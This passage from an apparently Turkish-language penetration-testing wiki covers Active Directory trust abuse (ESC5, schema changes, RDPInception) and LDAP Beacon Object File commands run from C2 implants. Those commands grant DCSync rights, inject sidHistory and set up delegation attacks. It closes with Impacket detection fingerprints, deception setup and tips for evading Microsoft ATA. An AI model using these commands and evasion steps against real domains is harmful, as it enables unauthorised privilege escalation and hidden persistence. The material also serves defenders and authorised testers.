Bu yöntem sabır gerektirir; yeni ayrıcalıklı AD nesnelerinin oluşturulmasını beklemek gerekir. SYSTEM yetkilerine sahip bir saldırgan, herhangi bir kullanıcıya tüm sınıflar üzerinde tam denetim vermek için AD Schema'yı değiştirebilir. Bu, yeni oluşturulan AD nesnelerine yetkisiz erişime ve bunlar üzerinde denetime yol açabilir.

Daha fazla bilgi için [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) yazısına bakabilirsiniz.<sup>[[14]](#references)</sup>

**ADCS ESC5 ile DA'dan EA'ya**

ADCS ESC5 güvenlik açığı, forest içindeki herhangi bir kullanıcı olarak kimlik doğrulamayı mümkün kılan bir certificate template oluşturmak için Public Key Infrastructure (PKI) nesnelerinin denetimini hedef alır. PKI nesneleri Configuration NC'de bulunduğundan, yazılabilir bir child DC'nin ele geçirilmesi ESC5 saldırılarının gerçekleştirilmesini sağlar.

Bu konuda daha fazla bilgiye [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) yazısından ulaşabilirsiniz.<sup>[[15]](#references)</sup> ADCS'nin bulunmadığı senaryolarda saldırgan, [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) yazısında açıklandığı gibi gerekli bileşenleri kurabilir.<sup>[[16]](#references)</sup>

### Harici Forest Domain - Tek Yönlü (Gelen) veya Çift Yönlü

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

Bu senaryoda **domain'iniz**, üzerinde **belirsiz izinlere** sahip olduğunuz harici bir domain tarafından **güvenilir** kabul edilir. Domain'inizdeki **hangi principal'ların** harici domain üzerinde hangi erişimlere sahip olduğunu bulmanız ve ardından bunları istismar etmeye çalışmanız gerekir:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Harici Forest Domain - Tek Yönlü (Giden)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

Bu senaryoda **domain'iniz**, **farklı domainlerdeki** principal'lara bazı **ayrıcalıkları** **güven ilişkisiyle devrediyor**.

Ancak, bir **domain güvenilen domain olduğunda**, güvenen domain, **tahmin edilebilir bir ad** kullanan ve **parola olarak güven ilişkisi parolasını** kullanan bir **kullanıcı oluşturur**. Bu da, **güvenen domain'deki bir kullanıcıya erişip güvenilen domain'e girerek** onu enumerate etmenin ve daha fazla ayrıcalığı yükseltmeye çalışmanın mümkün olduğu anlamına gelir:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Güvenilen domain'i ele geçirmenin başka bir yolu, domain trust'ın **ters yönünde** oluşturulmuş bir [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) bulmaktır (bu pek yaygın değildir).

Güvenilen domain'i ele geçirmenin bir başka yolu, **güvenilen domain'deki bir kullanıcının erişebildiği** bir makinede bekleyip kullanıcının **RDP** üzerinden oturum açmasını sağlamaktır. Ardından saldırgan, RDP oturum sürecine kod enjekte ederek buradan **kurbanın kaynak domain'ine erişebilir**.\
Ayrıca, **kurban sabit diskini bağladıysa**, saldırgan **RDP oturum** sürecinden **sabit diskin başlangıç klasörüne** **backdoor'lar** yerleştirebilir. Bu tekniğe **RDPInception** denir.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust suistimalini azaltma

### **SID Filtering:**

- Forest trust'ları üzerinden SID history özniteliğinden yararlanan saldırıların riski, varsayılan olarak tüm forest'lar arası trust'larda etkin olan SID Filtering ile azaltılır. Bu yaklaşım, Microsoft'un görüşüne uygun olarak, güvenlik sınırının domain değil forest olduğu kabulüyle, forest içi trust'ların güvenli olduğu varsayımına dayanır.
- Ancak bir sorun vardır: SID filtering uygulamaları ve kullanıcı erişimini bozabilir; bu nedenle zaman zaman devre dışı bırakılır.

### **Selective Authentication:**

- Forest'lar arası trust'larda Selective Authentication kullanmak, iki forest'taki kullanıcıların otomatik olarak doğrulanmamasını sağlar. Bunun yerine kullanıcıların, güvenen domain veya forest içindeki domain ve sunuculara erişebilmesi için açık izinler gerekir.
- Bu önlemlerin, yazılabilir Configuration Naming Context (NC) istismarına veya trust hesabına yönelik saldırılara karşı koruma sağlamadığını unutmamak önemlidir.

[**ired.team'de domain trust'ları hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implant'lardan LDAP tabanlı AD suistimali

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection), bloodyAD tarzı LDAP primitive'lerini tamamen on-host implant içinde (ör. Adaptix C2) çalışan x64 Beacon Object File'lar olarak yeniden uygular. Operatörler paketi `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` komutuyla derler, `ldap.axs` dosyasını yükler ve ardından beacon'dan `ldap <subcommand>` çağırır. Tüm trafik, imzalama/şifreleme ile LDAP (389) veya otomatik sertifika güveniyle LDAPS (636) üzerinden mevcut oturum açma güvenlik bağlamını kullanır; dolayısıyla socks proxy'lerine veya diskte artefaktlara gerek yoktur.<sup>[[4]](#references)</sup>

### Implant tarafında LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` ve `get-groupmembers`, kısa adları/OU yollarını tam DN'lere çözümler ve karşılık gelen nesneleri döker.
- `get-object`, `get-attribute` ve `get-domaininfo`, rastgele öznitelikleri (güvenlik tanımlayıcıları dahil) ve `rootDSE`'den forest/domain meta verilerini alır.
- `get-uac`, `get-spn`, `get-delegation` ve `get-rbcd`, roasting adaylarını, delegation ayarlarını ve mevcut [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) tanımlayıcılarını doğrudan LDAP'tan gösterir.
- `get-acl` ve `get-writable --detailed`, trustee'leri, hakları (GenericAll/WriteDACL/WriteOwner/öznitelik yazma izinleri) ve kalıtımı listelemek için DACL'yi ayrıştırır; böylece ACL privilege escalation için doğrudan hedefler belirlenir.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Yetki yükseltme ve kalıcılık için LDAP yazma ilkelleri

- Nesne oluşturma BOF'ları (`add-user`, `add-computer`, `add-group`, `add-ou`), operatörün OU yazma haklarının bulunduğu konumlarda yeni principal'lar veya makine hesapları oluşturmasını sağlar. Yazma özelliği hakları bulunduğunda `add-groupmember`, `set-password`, `add-attribute` ve `set-attribute`, hedeflerin doğrudan ele geçirilmesini sağlar.
- `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` ve `add-dcsync` gibi ACL odaklı komutlar, herhangi bir AD nesnesindeki WriteDACL/WriteOwner haklarını parola sıfırlama, grup üyeliğini denetleme veya DCSync replikasyon ayrıcalıklarına dönüştürür; PowerShell/ADSI izleri bırakmaz. `remove-*` karşılıkları, eklenen ACE'leri temizler.

### Delegation, roasting ve Kerberos kötüye kullanımı

- `add-spn`/`set-spn`, ele geçirilmiş bir kullanıcıyı anında Kerberoast edilebilir hâle getirir; `add-asreproastable` (UAC geçişi), parolaya dokunmadan kullanıcıyı AS-REP roasting için işaretler.
- Delegation makroları (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`), beacon üzerinden `msDS-AllowedToDelegateTo`, UAC bayraklarını veya `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğini yeniden yazar. Böylece constrained/unconstrained/RBCD saldırı yolları etkinleştirilir ve uzak PowerShell ya da RSAT gereksinimi ortadan kalkar.

### sidHistory enjeksiyonu, OU taşıma ve saldırı yüzeyini şekillendirme

- `add-sidhistory`, denetlenen bir principal'ın SID geçmişine ayrıcalıklı SID'ler enjekte eder ([SID-History Injection](sid-history-injection.md) bölümüne bakın) ve tamamen LDAP/LDAPS üzerinden gizli erişim kalıtımı sağlar.
- `move-object`, bilgisayarların veya kullanıcıların DN/OU konumunu değiştirir. Böylece saldırgan, `set-password`, `add-groupmember` veya `add-spn` kullanmadan önce varlıkları devredilmiş hakların kapsamına alabilir. Taşıma izinleri ve kalıtım denetimleri için [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) bölümüne bakın.
- Kapsamı dar tutulmuş kaldırma komutları (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember` vb.), operatör kimlik bilgilerini veya kalıcılığı elde ettikten sonra hızlı geri alma olanağı sunarak telemetriyi en aza indirir.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Bazı Genel Savunmalar

[**Kimlik bilgilerini nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Kimlik Bilgilerini Korumaya Yönelik Savunma Önlemleri**

- **Domain Admins kısıtlamaları**: Domain Admins hesaplarının yalnızca Domain Controller'larda oturum açmasına izin verilmesi, diğer ana makinelerde kullanılmamaları önerilir.
- **Service Account ayrıcalıkları**: Güvenliği korumak için servisler Domain Admin (DA) ayrıcalıklarıyla çalıştırılmamalıdır.
- **Ayrıcalıkların süreyle sınırlandırılması**: DA ayrıcalıkları gerektiren görevlerin süresi sınırlandırılmalıdır. Bu, şu komutla yapılabilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay riskini azaltma**: 2889/3074/3075 Event ID'lerini denetleyin, ardından LDAP MITM/relay girişimlerini engellemek için DC'lerde/istemcilerde LDAP signing ve LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket etkinliğinin protokol düzeyinde parmak izleri

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, yalnızca operatörün kontrolündeki yeniden adlandırılmış ikili dosyalar, servis adları, geçici batch dosyaları veya çıktı yolları gibi izlere güvenmeyin. Meşru Windows istemcilerinin [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI trafiğini nasıl oluşturduğuna ilişkin temel davranışları belirleyin; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını düzenledikten sonra bile kalan **uygulama farklılıklarını** arayın.<sup>[[8]](#references)</sup>

- **Yüksek güvenilirlikli, tek başına değerlendirilebilecek adaylar** (kendi temel davranışlarınızla doğruladıktan sonra):
  - `auth_context_id = 79231 + ctx_id` kullanan kimliği doğrulanmış DCE/RPC
  - `0xff` ile doldurulmuş DCE/RPC kimlik doğrulama dolgusu
  - Ham Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos bind'leri
  - ASCII'ye benzeyen `ClientGuid` değerlerine sahip SMB2/3 negotiate istekleri
  - Standart olmayan `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
  - Sabit kodlanmış Kerberos nonce değerleri
- **Korelasyon/skorlama özellikleri olarak kullanılması daha uygun olanlar**:
  - Seyrek veya yinelenen Kerberos etype listeleri, alışılmadık/eksik `PA-DATA` ya da yerel Windows'tan farklı TGS-REQ etype sıralaması
  - Sürüm bilgisi bulunmayan NTLM Type 1 mesajları veya boş ana bilgisayar adlarına sahip Type 3 mesajları
  - SPNEGO yerine DCE/RPC üzerinden taşınan ham NTLMSSP, eksik DCE/RPC doğrulama trailer'ları ya da SPNEGO/Kerberos OID uyuşmazlıkları
  - Aynı ana makine/kullanıcı/oturum/zaman aralığındaki bu özelliklerden birkaçının bir arada görülmesi, zayıf tekil alanlardan çok daha güçlü bir göstergedir
- **Tek başına alarm olarak değil, bağlam zenginleştirme amacıyla kullanın**:
  - Varsayılan dosya adları, çıktı yolları, rastgele servis adları, geçici batch adları, varsayılan bilgisayar hesabı adları ve araçlara özgü HTTP/WebDAV/RDP/MSSQL dizeleri
  - Operatörler bunları kolayca değiştirebilir; bunlar, protokoller arası şüpheli kümelenmenin nedenini açıklamak için en iyi şekilde kullanılır
- **Operasyonel notlar**:
  - Bu sinyallerden bazıları şifresi çözülmüş trafik, [PCAP/Zeek ayrıştırması](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya servis tarafında görünürlük gerektirir
  - Alarm olarak kullanmadan önce Samba/Linux istemcileri, cihazlar ve eski yazılımlarla doğrulayın
  - Temel davranışlar konusunda güveniniz arttıkça tespitleri bağlam zenginleştirmeden -> avcılığa -> alarm üretimine taşıyın

### **Deception Tekniklerinin Uygulanması**

- Deception uygulamak, parolaları süresi dolmayan veya Trusted for Delegation olarak işaretlenmiş kullanıcı ya da bilgisayar gibi yem nesneleri kurmayı içerir. Ayrıntılı bir yaklaşım; belirli haklara sahip kullanıcılar oluşturmayı veya onları yüksek ayrıcalıklı gruplara eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Pratik bir örnek olarak şu araçlar kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception tekniklerinin dağıtımı hakkında daha fazla bilgiye [GitHub'daki Deploy-Deception](https://github.com/samratashok/Deploy-Deception) sayfasından ulaşabilirsiniz.

### **Deception'ın Tespit Edilmesi**

- **Kullanıcı nesneleri için**: Şüpheli göstergeler arasında alışılmadık ObjectSID, seyrek oturum açma, oluşturulma tarihleri ve düşük hatalı parola sayıları bulunur.
- **Genel göstergeler**: Olası yem nesnelerin özniteliklerini gerçek nesnelerinkilerle karşılaştırmak tutarsızlıkları ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu tür deception'ları tespit etmeye yardımcı olabilir.

### **Tespit Sistemlerini Atlatma**

- **Microsoft ATA tespitini atlatma**:
  - **Kullanıcı numaralandırma**: ATA tarafından tespit edilmemek için Domain Controller'larda oturum numaralandırmasından kaçınma.
  - **Ticket taklidi**: Ticket oluştururken **aes** anahtarlarını kullanmak, NTLM'e düşürme yapmayarak tespitten kaçınmaya yardımcı olur.
  - **DCSync saldırıları**: ATA tespitinden kaçınmak için işlemi Domain Controller olmayan bir sistemden gerçekleştirmek önerilir; doğrudan Domain Controller'dan gerçekleştirmek alarmı tetikler.

## References

- [1] [Domain Trust'larına Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust'ları Sahteleme](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Koleksiyonu – Active Directory Exploitation için Bellek İçi LDAP Araç Seti](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Vay be! NTLM Hash'lerini Wordlist olarak Silahlandırma](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Korsanlar](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ı İnceleme](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon üzerinden Active Directory Hesaplarını Ele Geçirme](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon güvenli kanal bağlantılarındaki değişiklikleri yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC arayüzlerine yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter, domain'ler arasında güvenlik sınırı mıdır? (Bölüm 4) - SID filtering atlatma araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter, domain'ler arasında güvenlik sınırı mıdır? (Bölüm 5) - Golden GMSA trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter, domain'ler arasında güvenlik sınırı mıdır? (Bölüm 6) - Schema change trust saldırısı - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'dan EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS'yi kötüye kullanarak child domain admins'ten enterprise admins'e 5 dakikada yükselme: devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [Gizli Bir ACE: Active Directory DACL Backdoor'ları Tasarlama](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k modül kaynak kodu](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
